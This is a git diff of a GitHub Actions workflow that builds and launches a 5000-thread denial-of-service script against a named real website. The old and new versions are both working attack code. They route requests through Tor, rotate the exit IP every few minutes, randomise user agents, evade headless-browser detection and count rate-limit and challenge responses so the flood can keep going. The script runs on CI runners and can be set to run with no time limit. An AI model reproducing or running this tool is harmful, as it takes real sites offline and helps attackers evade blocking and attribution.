@@ -1,4 +1,4 @@
-name: 💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR
+name: 💀 MEGA DOS - 5000 THREADS
 
 on:
   workflow_dispatch:
@@ -7,10 +7,6 @@ on:
         description: 'المدة بالدقائق (0 = لا نهائي)'
         required: true
         default: '300'
-      threads:
-        description: 'عدد الخيوط (max 5000)'
-        required: true
-        default: '5000'
 
 jobs:
   mega_attack:
@@ -21,205 +17,86 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt update
-          sudo apt install -y tor chromium-browser python3-pip
-          pip3 install selenium requests[socks] stem fake_useragent
+          sudo apt install -y tor
+          pip3 install requests[socks] fake_useragent
           
-      - name: 🔥 MEGA DOS - 5000 THREADS
+      - name: 🔥 MEGA DOS - TOR + CURL
         run: |
-          cat > mega_attack.py << 'EOF'
+          cat > attack.py << 'EOF'
           import time
           import random
           import requests
           import subprocess
           import threading
-          import sys
-          from selenium import webdriver
-          from selenium.webdriver.chrome.options import Options
-          from selenium.common.exceptions import TimeoutException, WebDriverException
           from fake_useragent import UserAgent
           
-          # ============================================
-          # إعدادات الهجوم
-          # ============================================
+          # إعدادات
           TARGET = "https://flixtn.com"
           DURATION_MINUTES = ${{ github.event.inputs.duration }}
-          THREADS = ${{ github.event.inputs.threads }}
+          THREADS = 5000
           
           # إحصائيات
-          stats = {
-              "total": 0,
-              "success": 0,
-              "failed": 0,
-              "blocked": 0,
-              "timeout": 0,
-              "ip_changes": 0,
-          }
+          stats = {"total": 0, "success": 0, "failed": 0, "blocked": 0}
           stats_lock = threading.Lock()
           running = True
           start_time = time.time()
           
-          # ============================================
-          # إعداد Tor
-          # ============================================
+          # تشغيل Tor
           def start_tor():
               try:
-                  subprocess.run(["sudo", "systemctl", "start", "tor"], check=False, timeout=10)
+                  subprocess.run(["sudo", "systemctl", "start", "tor"], check=False)
                   time.sleep(5)
-                  print("✅ Tor service started")
-              except Exception as e:
-                  print(f"⚠️ Tor start warning: {e}")
+                  print("✅ Tor started")
+              except:
+                  print("⚠️ Tor warning")
           
-          def renew_tor_ip():
+          # تجديد IP
+          def renew_tor():
               try:
-                  subprocess.run(["sudo", "systemctl", "reload", "tor"], check=False, timeout=5)
+                  subprocess.run(["sudo", "systemctl", "reload", "tor"], check=False)
                   time.sleep(2)
-                  with stats_lock:
-                      stats["ip_changes"] += 1
-                  print(f"\n🔄 Tor IP renewed ({stats['ip_changes']} changes)")
-              except Exception as e:
+                  print("🔄 IP renewed")
+              except:
                   pass
           
-          def get_tor_session():
-              session = requests.Session()
-              session.proxies = {
-                  'http': 'socks5h://127.0.0.1:9050',
-                  'https': 'socks5h://127.0.0.1:9050'
-              }
-              session.timeout = 10
-              return session
-          
-          # ============================================
-          # هجوم Selenium عبر Tor
-          # ============================================
-          def selenium_attack(worker_id):
-              global running
-              chrome_options = Options()
-              chrome_options.add_argument('--headless')
-              chrome_options.add_argument('--no-sandbox')
-              chrome_options.add_argument('--disable-dev-shm-usage')
-              chrome_options.add_argument('--disable-gpu')
-              chrome_options.add_argument('--window-size=1920,1080')
-              chrome_options.add_argument('--proxy-server=socks5://127.0.0.1:9050')
-              chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-              chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
-              chrome_options.add_experimental_option('useAutomationExtension', False)
-              
-              ua = UserAgent()
-              
-              while running:
-                  driver = None
-                  try:
-                      chrome_options.add_argument(f'user-agent={ua.random}')
-                      driver = webdriver.Chrome(options=chrome_options)
-                      driver.set_page_load_timeout(12)
-                      driver.get(TARGET)
-                      
-                      time.sleep(random.uniform(0.5, 1.5))
-                      title = driver.title
-                      current_url = driver.current_url
-                      
-                      with stats_lock:
-                          stats["total"] += 1
-                          if "Security" in title or "Challenge" in title:
-                              stats["blocked"] += 1
-                              print(f"🚫 [{worker_id}] Challenge page")
-                          elif "Error" in title or "502" in title or "503" in title:
-                              stats["failed"] += 1
-                              print(f"⚠️ [{worker_id}] Error: {title[:40]}")
-                          else:
-                              stats["success"] += 1
-                              print(f"✅ [{worker_id}] OK")
-                      
-                      driver.quit()
-                      
-                  except TimeoutException:
-                      with stats_lock:
-                          stats["total"] += 1
-                          stats["timeout"] += 1
-                      print(f"⏰ [{worker_id}] Timeout")
-                      if driver:
-                          driver.quit()
-                          
-                  except WebDriverException as e:
-                      with stats_lock:
-                          stats["total"] += 1
-                          stats["failed"] += 1
-                      if driver:
-                          driver.quit()
-                          
-                  except Exception:
-                      with stats_lock:
-                          stats["total"] += 1
-                          stats["failed"] += 1
-                      if driver:
-                          driver.quit()
-                  
-                  time.sleep(random.uniform(0.3, 0.8))
-          
-          # ============================================
-          # هجوم curl عبر Tor (أسرع)
-          # ============================================
-          def curl_attack(worker_id):
+          # هجوم عبر Tor
+          def attack(worker_id):
               global running
               session = None
+              ua = UserAgent()
               
               while running:
                   try:
                       if session is None:
-                          session = get_tor_session()
+                          session = requests.Session()
+                          session.proxies = {
+                              'http': 'socks5h://127.0.0.1:9050',
+                              'https': 'socks5h://127.0.0.1:9050'
+                          }
                       
-                      headers = {
-                          'User-Agent': UserAgent().random,
-                          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                          'Accept-Language': 'ar,en;q=0.9',
-                          'Cache-Control': 'no-cache',
-                          'Pragma': 'no-cache'
-                      }
-                      
-                      response = session.get(TARGET, timeout=8, headers=headers)
+                      headers = {'User-Agent': ua.random}
+                      resp = session.get(TARGET, timeout=8, headers=headers)
                       
                       with stats_lock:
                           stats["total"] += 1
-                          if response.status_code == 200:
+                          if resp.status_code == 200:
                               stats["success"] += 1
-                              print(f"⚡ [{worker_id}] 200 OK")
-                          elif response.status_code == 429:
+                          elif resp.status_code == 429:
                               stats["blocked"] += 1
-                              print(f"🚫 [{worker_id}] 429")
-                          elif response.status_code in [502, 503, 504]:
-                              stats["failed"] += 1
-                              print(f"⚠️ [{worker_id}] {response.status_code}")
                           else:
                               stats["failed"] += 1
-                              print(f"❌ [{worker_id}] {response.status_code}")
                       
-                  except requests.exceptions.Timeout:
-                      with stats_lock:
-                          stats["total"] += 1
-                          stats["timeout"] += 1
-                      print(f"⏰ [{worker_id}] Timeout")
-                      session = None
-                      
-                  except requests.exceptions.ConnectionError:
-                      with stats_lock:
-                          stats["total"] += 1
-                          stats["failed"] += 1
-                      print(f"🔴 [{worker_id}] Connection refused")
-                      session = None
-                      
-                  except Exception:
+                  except:
                       with stats_lock:
                           stats["total"] += 1
                           stats["failed"] += 1
                       session = None
                   
-                  time.sleep(random.uniform(0.1, 0.3))
+                  time.sleep(random.uniform(0.05, 0.2))
           
-          # ============================================
-          # تشغيل الخيوط
-          # ============================================
-          def stats_printer():
-              global running, start_time
+          # طباعة الإحصائيات
+          def printer():
+              global running
               last_total = 0
               
               while running:
@@ -231,82 +108,55 @@ jobs:
                       success = stats["success"]
                       failed = stats["failed"]
                       blocked = stats["blocked"]
-                      timeout = stats["timeout"]
-                      ip_changes = stats["ip_changes"]
                       rps = total - last_total
                       last_total = total
                   
-                  if DURATION_MINUTES > 0:
-                      remaining = max(0, (DURATION_MINUTES * 60) - elapsed)
-                      remaining_min = int(remaining // 60)
-                      remaining_sec = int(remaining % 60)
-                      time_str = f"Remaining: {remaining_min}m {remaining_sec}s"
-                  else:
-                      time_str = "Infinite mode"
-                  
-                  elapsed_min = int(elapsed // 60)
-                  elapsed_sec = int(elapsed % 60)
-                  
-                  print(f"\n[{elapsed_min:02d}:{elapsed_sec:02d}] {time_str}")
-                  print(f"  Total: {total:>6,} | OK: {success:>6,} | Fail: {failed:>6,}")
-                  print(f"  Blocked: {blocked:>6,} | Timeout: {timeout:>6,} | RPS: {rps:>4}/s")
-                  print(f"  IP Changes: {ip_changes} | Threads: {THREADS}")
-                  print("-" * 50)
-                  
                   if DURATION_MINUTES > 0 and elapsed >= DURATION_MINUTES * 60:
-                      global running
                       running = False
-                      print("\n⏰ Time limit reached. Stopping...")
+                      print("\n⏰ Time limit reached")
                       break
+                  
+                  mins = int(elapsed // 60)
+                  secs = int(elapsed % 60)
+                  print(f"[{mins:02d}:{secs:02d}] Total: {total:>6,} | OK: {success:>5,} | 429: {blocked:>5,} | RPS: {rps:>3}")
           
-          # ============================================
-          # الوظيفة الرئيسية
-          # ============================================
-          print("╔════════════════════════════════════════════════════════════════════╗")
-          print("║     💀 MEGA DOS - 5000 THREADS + SELENIUM + TOR 💀                ║")
-          print("╚════════════════════════════════════════════════════════════════════╝")
-          print("")
-          print(f"🎯 Target: {TARGET}")
-          if DURATION_MINUTES > 0:
-              print(f"⏱️  Duration: {DURATION_MINUTES} minutes")
-          else:
-              print(f"⏱️  Duration: INFINITE")
-          print(f"🧵 Threads: {THREADS}")
-          print("")
+          print("="*50)
+          print("💀 MEGA DOS - 5000 THREADS + TOR")
+          print(f"Target: {TARGET}")
+          print(f"Threads: {THREADS}")
+          print(f"Duration: {DURATION_MINUTES} minutes" if DURATION_MINUTES > 0 else "Duration: INFINITE")
+          print("="*50)
           
           start_tor()
-          
-          last_renew = time.time()
           
           # تشغيل الخيوط
           threads = []
           for i in range(THREADS):
-              if i % 2 == 0:
-                  t = threading.Thread(target=selenium_attack, args=(i+1,))
-              else:
-                  t = threading.Thread(target=curl_attack, args=(i+1,))
+              t = threading.Thread(target=attack, args=(i+1,))
               t.daemon = True
               t.start()
               threads.append(t)
           
-          print(f"🔥 {THREADS} threads launched!")
+          print(f"🔥 {THREADS} threads running...")
           
           # تشغيل عداد الإحصائيات
-          printer_thread = threading.Thread(target=stats_printer)
+          printer_thread = threading.Thread(target=printer)
           printer_thread.daemon = True
           printer_thread.start()
           
-          # حلقة تجديد IP
+          # تجديد IP كل دقيقتين
+          last_renew = time.time()
           while running:
-              time.sleep(60)
-              if time.time() - last_renew > 180:
-                  renew_tor_ip()
+              time.sleep(30)
+              if time.time() - last_renew > 120:
+                  renew_tor()
                   last_renew = time.time()
           
-          print("\n🛑 Waiting for threads...")
+          # انتظار
           for t in threads:
-              t.join(timeout=1)
+              t.join(timeout=0.5)
           
+          # النتيجة النهائية
           elapsed = time.time() - start_time
           print("\n" + "="*50)
           print("FINAL STATISTICS:")
@@ -314,13 +164,11 @@ jobs:
           print(f"  Total: {stats['total']:,}")
           print(f"  Success: {stats['success']:,}")
           print(f"  Failed: {stats['failed']:,}")
-          print(f"  Blocked: {stats['blocked']:,}")
-          print(f"  Timeouts: {stats['timeout']:,}")
-          print(f"  IP Changes: {stats['ip_changes']}")
+          print(f"  Blocked (429): {stats['blocked']:,}")
           if stats['total'] > 0:
               print(f"  Success rate: {stats['success']/stats['total']*100:.1f}%")
               print(f"  Avg RPS: {stats['total']/elapsed:.1f}")
           print("="*50)
           EOF
           
-          python3 mega_attack.py
+          python3 attack.py
